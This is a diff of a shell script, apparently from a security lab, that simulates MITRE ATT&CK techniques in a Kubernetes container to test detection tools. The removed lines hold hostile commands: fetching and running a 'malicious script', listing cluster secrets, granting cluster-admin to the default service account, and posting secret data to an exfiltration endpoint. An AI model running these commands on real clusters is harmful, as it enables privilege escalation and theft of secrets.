@@ -1,47 +1,12 @@
-#!/bin/bash
-echo "[*] Downloading malicious script."
-wget -q https://raw.githubusercontent.com/hankthebldr/xsiam-prisma-cdr-lab/refs/heads/alpha/1.0/malicous-container/malicous-container.sh -O virus.sh && chmod +x virus.sh
-
-echo "[*] Enumerating cluster pods."
-kubectl get pods --all-namespaces || echo "[!] Failed to list pods."
-
-echo "[*] Enumerating cluster services."
-kubectl get svc --all-namespaces || echo "[!] Failed to list services."
-
-echo "[*] Enumerating cluster secrets."
-kubectl get secrets --all-namespaces || echo "[!] Failed to list secrets."
-
-echo "[*] Describing nodes."
-kubectl describe nodes || echo "[!] Failed to describe nodes."
-
-echo "[*] Attempting Privilege Escalation via clusterrolebinding."
-kubectl create clusterrolebinding attacker --clusterrole=cluster-admin --serviceaccount=default:default 2>/dev/null || echo "[!] Failed to create clusterrolebinding (likely due to RBAC)."
-
-echo "[*] Executing malicious script."
-./virus.sh || echo "[!] Malicious script execution failed."
-
-echo "[*] Simulating data exfiltration."
-curl -X POST "${EXFIL_ENDPOINT}" -d "${SECRET_DATA}" || echo "[!] Data exfiltration attempt failed."
-
-echo "[*] Keeping the container alive for observation."
-sleep 3600
-
-
-# This script simulates MITRE ATT&CK TTPs within a container.
-# It runs indefinitely or until a set iteration count is reached.
-#
-# Set the environment variable ITERATIONS to control how many times to run (default: infinite).
-# e.g. ITERATIONS=10 ./simulate_ttps.sh
-#
+#!/usr/bin/env sh
+# TTP execution in a loop 
 # Add detection and logging mechanisms in your environment and see how your security tools respond.
-
 # ANSI colors for clarity
 GREEN="\033[1;32m"
 BLUE="\033[1;34m"
 YELLOW="\033[1;33m"
 RED="\033[1;31m"
 RESET="\033[0m"
-
 ITERATIONS="${ITERATIONS:-0}"   # 0 means infinite loop
 COUNTER=0
 
